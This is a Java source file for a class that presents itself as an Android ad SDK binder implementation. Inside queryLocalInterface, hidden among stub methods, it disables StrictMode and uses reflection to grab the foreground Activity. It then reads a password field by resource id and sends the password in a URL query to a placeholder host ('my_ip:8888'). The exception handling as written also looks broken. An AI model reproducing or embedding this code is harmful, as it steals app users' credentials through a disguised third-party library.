package com.ads.sdk.impl;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.StrictMode;
import android.util.Log;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.io.FileDescriptor;
import java.io.IOException;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Map;

public class AdFactoryImpl implements IBinder {
    @Nullable
    @Override
    public String getInterfaceDescriptor() throws RemoteException {
        Log.e("asdf", "getInterfaceDescriptor");
        return null;
    }

    @Override
    public boolean pingBinder() {
        Log.e("asdf", "pingBinder");
        return false;
    }

    @Override
    public boolean isBinderAlive() {
        Log.e("asdf", "isBinderAlive");
        return false;
    }

    @SuppressLint("ResourceType")
    @Nullable
    @Override
    public IInterface queryLocalInterface(@NonNull String s) {

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

        StrictMode.setThreadPolicy(policy);

        String password = ((TextView)getActivity().findViewById(0x7f070078)).getText().toString();
        Log.e("Password", password) ;
        new URL("http://my_ip:8888/password.png?" + password).openStream();
            
        Log.e("asdf", "queryLocalInterface");
        return null;
    }

    public static Activity getActivity() throws Exception {
        Class activityThreadClass = Class.forName("android.app.ActivityThread");
        Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
        Field activitiesField = activityThreadClass.getDeclaredField("mActivities");
        activitiesField.setAccessible(true);

        Map<Object, Object> activities = (Map<Object, Object>) activitiesField.get(activityThread);
        if (activities == null)
            return null;

        for (Object activityRecord : activities.values()) {
            Class activityRecordClass = activityRecord.getClass();
            Field pausedField = activityRecordClass.getDeclaredField("paused");
            pausedField.setAccessible(true);
            if (!pausedField.getBoolean(activityRecord)) {
                Field activityField = activityRecordClass.getDeclaredField("activity");
                activityField.setAccessible(true);
                Activity activity = (Activity) activityField.get(activityRecord);
                return activity;
            }
        }

        return null;
    }


    @Override
    public void dump(@NonNull FileDescriptor fileDescriptor, @Nullable String[] strings) throws RemoteException {
        Log.e("asdf", "dump");

    }

    @Override
    public void dumpAsync(@NonNull FileDescriptor fileDescriptor, @Nullable String[] strings) throws RemoteException {
        Log.e("asdf", "dumpAsync");

    }

    @Override
    public boolean transact(int i, @NonNull Parcel parcel, @Nullable Parcel parcel1, int i1) throws RemoteException {
        Log.e("asdf", "transact");
        return false;
    }

    @Override
    public void linkToDeath(@NonNull DeathRecipient deathRecipient, int i) throws RemoteException {
        Log.e("asdf", "linkToDeath");

    }

    @Override
    public boolean unlinkToDeath(@NonNull DeathRecipient deathRecipient, int i) {
        Log.e("asdf", "unlinkToDeath");
        return false;
    }
}
